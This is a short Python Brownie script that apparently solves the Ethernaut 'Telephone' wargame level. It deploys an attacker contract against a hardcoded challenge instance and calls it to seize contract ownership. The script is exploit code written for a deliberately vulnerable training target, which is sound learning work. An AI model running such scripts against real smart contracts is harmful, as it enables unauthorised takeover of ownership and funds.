from scripts.helpful_scripts import get_account
from brownie import interface, Attack04

ETHERNAUT_INSTANCE = "0x05324798452fc61A5163216AFFFcDa2C8024DF0C"


def main():

    player = get_account()

    attacker_contract = Attack04.deploy(ETHERNAUT_INSTANCE, {"from": player})

    attack_interface = interface.Iattack_telephone(attacker_contract.address)

    telphone_interface = interface.ITelephone(ETHERNAUT_INSTANCE)

    print(f"attack interface: {attack_interface}")
    print(f"telephone interface: {telphone_interface}")

    attacker_contract.changeOwner({"from": player})

    # attack_interface.change({"from": player})

    # owner = telphone_interface.owner()

    # print("Player is ", player)
    # print("Owner is", owner)
